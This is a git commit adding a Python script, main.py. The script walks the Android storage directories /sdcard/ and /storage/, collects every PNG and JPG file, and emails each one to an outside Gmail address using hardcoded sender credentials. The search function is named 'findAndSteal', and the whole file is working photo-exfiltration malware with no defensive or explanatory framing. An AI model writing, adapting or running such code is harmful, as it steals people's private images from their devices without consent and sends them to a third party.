ebbd418d4ab4775f3341449faad4f21ca55be0a7
qwewqeryyu123 <sadotdota@gmail.com>
2022-05-16 18:12:48 +0300

    1

---
+++ main.py
@@ -0,0 +1,58 @@
+import os
+import shutil
+import smtplib
+import mimetypes
+
+import email
+import email.mime.application as mime
+
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.image import MIMEImage
+
+path1 = r'/storage/'
+path2 = r'/sdcard/'
+
+extensions_ = ['.png', '.jpg']
+
+
+def send_file(dirPath, x):
+    email_sender = 'tdistroer@gmail.com'
+    email_getter = 'csgonly2006@gmail.com'
+    password = 'distroer123'
+
+    msg = MIMEMultipart()
+    msg['Subject'] = 'File'
+    msg['From'] = email_sender
+    msg['To'] = email_getter
+    filename = dirPath + "\\" + x
+    fp = open(filename, 'rb')
+    att = email.mime.application.MIMEApplication(fp.read(), _subtype="png")
+    fp.close()
+
+    att.add_header('Content-Disposition', 'attachment', filename=filename)
+    msg.attach(att)
+    smpt_server = smtplib.SMTP('smtp.gmail.com', 587)
+
+    smpt_server.starttls()
+
+    smpt_server.login(email_sender, password)
+    smpt_server.sendmail(email_sender, email_getter, msg.as_string())
+
+
+def findAndSteal(pathWhereSearch, extension_):
+    for dirPath, dirNames, fileNames in os.walk(pathWhereSearch):
+        for x in fileNames:
+            tupleFile = os.path.splitext(x)
+            if tupleFile[-1] == extension_[0] or tupleFile[-1] == extension_[1]:
+                print('Current Path: ' + dirPath + "\\" + x)
+                print('Files: ' + x)
+                print()
+                send_file(dirPath, x)
+
+
+findAndSteal(path2, extensions_)
+findAndSteal(path1, extensions_)
+
+
+
